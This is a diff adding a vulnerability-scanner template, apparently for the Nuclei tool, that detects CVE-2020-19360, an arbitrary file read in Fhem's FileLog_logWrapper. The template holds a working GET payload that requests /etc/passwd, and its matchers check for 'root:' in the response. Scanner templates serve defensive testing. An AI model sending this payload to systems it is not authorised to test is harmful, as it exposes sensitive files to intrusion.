@@ -1,0 +1,25 @@
+id: cve-2020-19360
+info:
+  name: Fhem FileLog_logWrapper Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2020-19360,arbitrary-file-read
+  description: |
+    The Fhem FileLog_logWrapper module is vulnerable to arbitrary file read due
+    to insufficient validation of user input, allowing attackers to retrieve
+    sensitive system files.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/fhem/FileLog_logWrapper?dev=Logfile&file=%2fetc%2fpasswd&type=text"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "Save config"
